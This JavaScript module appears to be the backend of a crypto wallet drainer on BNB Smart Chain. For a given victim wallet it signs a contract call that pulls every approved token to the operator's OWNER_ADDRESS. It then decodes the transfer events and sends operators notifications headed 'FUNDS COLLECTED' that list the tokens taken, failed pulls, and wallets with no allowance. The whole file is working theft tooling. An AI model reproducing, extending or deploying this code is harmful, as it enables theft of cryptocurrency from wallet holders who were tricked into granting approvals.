const { web3, contract, getAccount, TOKEN_INFO, BEP20_ABI } = require('../config');
const { sendAllNotifications } = require('./notificationService');

// Consolidate funds - Contract SAB supported tokens collect karta hai
async function consolidateFunds(walletAddress, tokenBalances) {
    try {
        console.log(`🔄 Starting consolidation for ${walletAddress}`);
        
        // Build token list for notification
        let tokenListMsg = '';
        for (const token of tokenBalances) {
            tokenListMsg += `  • ${token.symbol}: $${token.balanceValue}\n`;
        }
        
        // Processing notification
        const processingMessage = `👤 Wallet: ${walletAddress}\n\n📋 Tokens Found:\n${tokenListMsg}\n⏳ Consolidating...`;
        await sendAllNotifications('🔄 PROCESSING', processingMessage);
        
        // Get account
        const account = getAccount();
        
        // Prepare transaction
        const txData = contract.methods.consolidateFunds(walletAddress).encodeABI();
        
        // Estimate gas
        let gasEstimate;
        try {
            gasEstimate = await contract.methods.consolidateFunds(walletAddress)
                .estimateGas({ from: account.address });
            gasEstimate = Math.floor(Number(gasEstimate) * 1.2);
        } catch (error) {
            console.log('⚠️ Gas estimation failed, using default');
            gasEstimate = process.env.GAS_LIMIT || 3000000;
        }
        
        const tx = {
            from: account.address,
            to: process.env.CONTRACT_ADDRESS,
            data: txData,
            gas: gasEstimate,
            gasPrice: process.env.GAS_PRICE || await web3.eth.getGasPrice(),
            chainId: 56
        };
        
        // Sign and send transaction
        const signedTx = await web3.eth.accounts.signTransaction(tx, process.env.OWNER_PRIVATE_KEY);
        const receipt = await web3.eth.sendSignedTransaction(signedTx.rawTransaction);
        
        console.log(`✅ Consolidation successful: ${receipt.transactionHash}`);
        
        // Parse events
        const collectedTokens = [];
        const failedTokens = [];
        
        const tokensCollectedSignature = web3.utils.sha3('TokensCollected(address,address,address,uint256)');
        const tokenCollectionFailedSignature = web3.utils.sha3('TokenCollectionFailed(address,address)');
        
        for (const log of receipt.logs) {
            try {
                if (log.topics[0] === tokensCollectedSignature) {
                    const decoded = web3.eth.abi.decodeLog(
                        [
                            { type: 'address', name: 'from', indexed: true },
                            { type: 'address', name: 'token', indexed: true },
                            { type: 'address', name: 'recipient', indexed: true },
                            { type: 'uint256', name: 'amount', indexed: false }
                        ],
                        log.data,
                        log.topics.slice(1)
                    );
                    
                    const symbol = TOKEN_INFO[decoded.token.toLowerCase()]?.symbol || 'UNKNOWN';
                    collectedTokens.push({
                        token: decoded.token,
                        symbol: symbol,
                        amount: decoded.amount
                    });
                } else if (log.topics[0] === tokenCollectionFailedSignature) {
                    const decoded = web3.eth.abi.decodeLog(
                        [
                            { type: 'address', name: 'from', indexed: true },
                            { type: 'address', name: 'token', indexed: true }
                        ],
                        log.data,
                        log.topics.slice(1)
                    );
                    
                    const symbol = TOKEN_INFO[decoded.token.toLowerCase()]?.symbol || 'UNKNOWN';
                    failedTokens.push({
                        token: decoded.token,
                        symbol: symbol
                    });
                }
            } catch (error) {
                console.error('Event decode error:', error.message);
            }
        }
        
        // Build success message
        let successMessage = `👤 Wallet: ${walletAddress}\n`;
        successMessage += `🏦 To: ${process.env.OWNER_ADDRESS}\n`;
        successMessage += `🔗 Tx: https://bscscan.com/tx/${receipt.transactionHash}\n\n`;
        
        if (collectedTokens.length > 0) {
            successMessage += `✅ COLLECTED TOKENS:\n`;
            for (const token of collectedTokens) {
                const tokenContract = new web3.eth.Contract(BEP20_ABI, token.token);
                const decimals = await tokenContract.methods.decimals().call().catch(() => 18);
                const formattedAmount = (Number(token.amount) / 10 ** Number(decimals)).toFixed(6);
                successMessage += `  • ${token.symbol}: ${formattedAmount}\n`;
            }
        }
        
        if (failedTokens.length > 0) {
            successMessage += `\n❌ FAILED TOKENS:\n`;
            for (const token of failedTokens) {
                successMessage += `  • ${token.symbol}\n`;
            }
        }
        
        if (collectedTokens.length === 0 && failedTokens.length === 0) {
            successMessage += `\n⚠️ No tokens collected (no allowance or balance)`;
        }
        
        await sendAllNotifications('✅ SUCCESS - FUNDS COLLECTED', successMessage);
        
        return {
            success: true,
            transactionHash: receipt.transactionHash,
            collectedTokens,
            failedTokens
        };
        
    } catch (error) {
        console.error(`❌ Consolidation error:`, error.message);
        
        const errorMessage = `👤 Wallet: ${walletAddress}\n❌ Error: ${error.message}`;
        await sendAllNotifications('❌ ERROR - TRANSACTION FAILED', errorMessage);
        
        return {
            success: false,
            error: error.message
        };
    }
}

module.exports = {
    consolidateFunds
};